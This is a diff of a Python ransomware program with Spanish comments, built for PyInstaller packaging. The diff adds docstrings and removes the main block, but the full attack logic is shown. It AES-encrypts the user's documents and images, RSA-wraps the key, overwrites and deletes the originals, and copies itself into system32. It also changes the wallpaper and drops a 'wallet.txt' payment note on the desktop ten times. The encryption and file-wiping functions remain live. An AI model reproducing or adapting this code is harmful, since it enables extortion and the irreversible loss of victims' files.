@@ -1,3 +1,14 @@
+"""
+Este programa realiza múltiples acciones, incluyendo cifrado de archivos con AES y RSA, manipulación de archivos, 
+y modificaciones del sistema en Windows. Está diseñado para ser empaquetado con PyInstaller.
+
+Funciones incluidas:
+- Generación y cifrado de claves AES
+- Cifrado de archivos con AES
+- Manipulación del sistema (copiado a system32, cambio de fondo de escritorio)
+- Copiado de archivos wallet al escritorio
+"""
+
 import os
 import base64
 import shutil
@@ -10,12 +21,35 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives import serialization, hashes
 import sys
 
-# Función para generar una clave AES aleatoria de 256 bits
 def generar_clave_aes():
-    return get_random_bytes(32)  # 32 bytes = 256 bits
+    """
+    Genera una clave AES de 256 bits (32 bytes) aleatoria.
+    
+    Retorna:
+        bytes: Clave AES de 256 bits.
+    
+    Lógica:
+    Se utiliza la función get_random_bytes para generar una cadena de bytes aleatoria de longitud fija, que 
+    corresponde a una clave de cifrado de 256 bits.
+    """
+    return get_random_bytes(32)
 
-# Función para cifrar la clave AES con RSA utilizando la llave pública proporcionada
 def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
+    """
+    Cifra la clave AES utilizando un cifrado RSA con la llave pública proporcionada.
+    
+    Args:
+        clave_aes (bytes): Clave AES que se desea cifrar.
+        public_key_pem (str): Clave pública RSA en formato PEM.
+    
+    Retorna:
+        str: Clave AES cifrada y codificada en base64.
+    
+    Lógica:
+    La clave AES es cifrada usando el esquema RSA con OAEP, que es un esquema de cifrado basado en clave pública
+    y utiliza el algoritmo SHA-256 tanto en la función MGF1 como en el algoritmo principal.
+    El resultado se codifica en base64 para su fácil almacenamiento y transmisión.
+    """
     public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
     clave_cifrada = public_key.encrypt(
         clave_aes,
@@ -27,25 +61,42 @@ def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
     )
     return base64.b64encode(clave_cifrada).decode()
 
-# Función para leer la clave pública desde un archivo
 def leer_clave_publica():
-    # Si estamos en PyInstaller, usar la carpeta _MEIPASS para acceder al archivo
+    """
+    Lee la clave pública desde el archivo 'public_key.pem'.
+
+    Retorna:
+        str: Contenido del archivo PEM de la clave pública.
+    
+    Lógica:
+    Dependiendo de si el programa está empaquetado con PyInstaller o no, se accede al archivo 'public_key.pem' en 
+    la ubicación correcta. El archivo es leído y su contenido se retorna como una cadena de texto.
+    """
     if getattr(sys, 'frozen', False):
         base_path = sys._MEIPASS
     else:
         base_path = os.path.dirname(os.path.abspath(__file__))
 
-    # Ruta completa del archivo 'public_key.pem'
     ruta_clave_publica = os.path.join(base_path, 'public_key.pem')
 
-    # Leer el contenido del archivo
     with open(ruta_clave_publica, 'r') as f:
         public_key_pem = f.read()
 
     return public_key_pem
 
-# Función para cifrar archivos con AES
 def cifrar_archivo_aes(archivo, clave_aes):
+    """
+    Cifra un archivo utilizando el cifrado AES en modo CBC.
+
+    Args:
+        archivo (str): Ruta al archivo que se desea cifrar.
+        clave_aes (bytes): Clave AES utilizada para el cifrado.
+    
+    Lógica:
+    Se utiliza el modo de cifrado CBC con un vector de inicialización (IV) generado automáticamente. 
+    El archivo es leído en su totalidad y los datos son cifrados con AES, luego se guarda el archivo cifrado 
+    en una nueva ruta con la extensión '.owo'.
+    """
     cipher = AES.new(clave_aes, AES.MODE_CBC)
     iv = cipher.iv
     with open(archivo, 'rb') as f:
@@ -55,52 +106,83 @@ def cifrar_archivo_aes(archivo, clave_aes):
     with open(archivo + '.owo', 'wb') as f:
         f.write(iv + datos_cifrados)
 
-# Función para borrar un archivo de forma segura
 def borrar_archivo_seguro(archivo):
-    # Sobrescribir el archivo con datos aleatorios antes de eliminarlo
+    """
+    Borra un archivo de forma segura sobrescribiéndolo con datos aleatorios antes de eliminarlo.
+
+    Args:
+        archivo (str): Ruta al archivo que se desea borrar.
+    
+    Lógica:
+    El archivo es sobrescrito con datos aleatorios de la misma longitud antes de ser eliminado, lo que dificulta su 
+    recuperación mediante técnicas de recuperación de datos.
+    """
     with open(archivo, 'ba+', buffering=0) as f:
         length = f.tell()
         f.seek(0)
-        f.write(os.urandom(length))  # Sobrescribir con datos aleatorios
+        f.write(os.urandom(length))
 
-    # Eliminar el archivo después de sobrescribirlo
     os.remove(archivo)
 
-# Función para copiar el ejecutable a la carpeta system32
 def copiar_ejecutable_a_system32():
+    """
+    Copia el ejecutable actual del programa a la carpeta 'system32' de Windows.
+
+    Lógica:
+    El programa identifica si está empaquetado como un ejecutable usando PyInstaller. Si es así, copia el ejecutable
+    en ejecución a la carpeta 'system32' para garantizar que el programa tenga presencia en un directorio del sistema.
+    """
     windir = os.environ['WINDIR']
     system32_path = os.path.join(windir, 'system32')
     
-    # Obtener la ruta del ejecutable actual (en el caso de PyInstaller)
     if getattr(sys, 'frozen', False):
-        current_executable = sys.executable  # El ejecutable generado por PyInstaller
+        current_executable = sys.executable
     else:
-        current_executable = os.path.abspath(__file__)  # Caso normal para scripts no empaquetados
+        current_executable = os.path.abspath(__file__)
     
-    # Copiar el ejecutable a la ruta system32
     shutil.copy(current_executable, system32_path)
 
-# Función para cambiar el fondo de escritorio
 def cambiar_fondo_escritorio(ruta_imagen):
-    image_path = os.path.abspath(ruta_imagen)
+    """
+    Cambia el fondo de escritorio de Windows usando la imagen proporcionada.
+
+    Args:
+        ruta_imagen (str): Ruta a la imagen que se usará como fondo de pantalla.
     
-    # Cambiar el fondo de escritorio usando SystemParametersInfoW
+    Lógica:
+    Utiliza la función `SystemParametersInfoW` de la biblioteca ctypes para modificar el fondo de escritorio del 
+    usuario con la imagen proporcionada.
+    """
+    image_path = os.path.abspath(ruta_imagen)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
 
-# Obtener la ruta de la imagen empaquetada con pyinstaller
 def obtener_ruta_imagen_empaquetada():
-    # Si el script se está ejecutando desde un .exe empaquetado
+    """
+    Obtiene la ruta de la imagen empaquetada con PyInstaller, si aplica.
+
+    Retorna:
+        str: Ruta a la imagen 'fondo.png'.
+    
+    Lógica:
+    Si el programa está empaquetado, se obtiene la ruta de la imagen desde la carpeta interna de PyInstaller. Si no, 
+    se devuelve una ruta relativa predeterminada.
+    """
     if getattr(sys, '_MEIPASS', False):
-        return os.path.join(sys._MEIPASS, 'fondo.png')  # Nombre de la imagen
+        return os.path.join(sys._MEIPASS, 'fondo.png')
     else:
-        return 'fondo.png'  # Ruta alternativa si no está empaquetada
+        return 'fondo.png'
 
-# Función para copiar el archivo wallet.txt al escritorio 10 veces, aumentando las "t"s
 def copiar_wallet_al_escritorio():
-    user_profile = os.environ['USERPROFILE']
-    desktop_dir = os.path.join(user_profile, 'Desktop')  # Ruta del escritorio
+    """
+    Copia el archivo 'wallet.txt' al escritorio del usuario, creando 10 copias con nombres incrementales.
 
-    # Ruta al archivo original wallet.txt (obtenido desde PyInstaller)
+    Lógica:
+    El archivo 'wallet.txt' es copiado al escritorio con nombres que varían en el número de 't's al final del nombre.
+    Este proceso se repite 10 veces para generar múltiples copias del archivo.
+    """
+    user_profile = os.environ['USERPROFILE']
+    desktop_dir = os.path.join(user_profile, 'Desktop')
+
     if getattr(sys, 'frozen', False):
         base_path = sys._MEIPASS
     else:
@@ -109,53 +191,6 @@ def copiar_wallet_al_escritorio():
     wallet_path = os.path.join(base_path, 'wallet.txt')
 
     for i in range(10):
-        # Crear el nombre del archivo con un número creciente de 't's
         nombre_archivo = f"wallett{'t' * i}.txt"
         ruta_destino = os.path.join(desktop_dir, nombre_archivo)
-
-        # Copiar wallet.txt al escritorio con el nuevo nombre
         shutil.copy(wallet_path, ruta_destino)
-
-
- 
-
-# Obtener el directorio "Documents" del usuario
-user_profile = os.environ['USERPROFILE']
-documents_dir = os.path.join(user_profile, 'Documents')
-
-# Copiar el ejecutable a la carpeta system32
-copiar_ejecutable_a_system32()
-
-# Extensiones que se desean cifrar
-extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
-
-# Generar clave AES
-clave_aes = generar_clave_aes()
-
-# Llave pública proporcionada (en formato PKCS#8).
-# Leer la clave pública desde el archivo
-public_key_pem = leer_clave_publica()
-
-# Cifrar la clave AES con RSA
-clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)
-
-# Guardar la clave cifrada en un archivo
-with open(os.path.join(documents_dir, 'clave_aes_cifrada.lol'), 'w') as f:
-    f.write(clave_aes_cifrada)
-
-# Cifrar los archivos seleccionados
-for foldername, subfolders, filenames in os.walk(documents_dir):
-    for filename in filenames:
-        if any(filename.endswith(ext) for ext in extensions):
-            file_path = os.path.join(foldername, filename)
-            # Cifrar el archivo con AES
-            cifrar_archivo_aes(file_path, clave_aes)
-            # Borrar de forma segura el archivo original
-            borrar_archivo_seguro(file_path)
-
-# Cambiar el fondo de escritorio al final
-ruta_imagen = obtener_ruta_imagen_empaquetada()
-cambiar_fondo_escritorio(ruta_imagen)
-
-# Copiar wallet.txt al escritorio 10 veces
-copiar_wallet_al_escritorio()
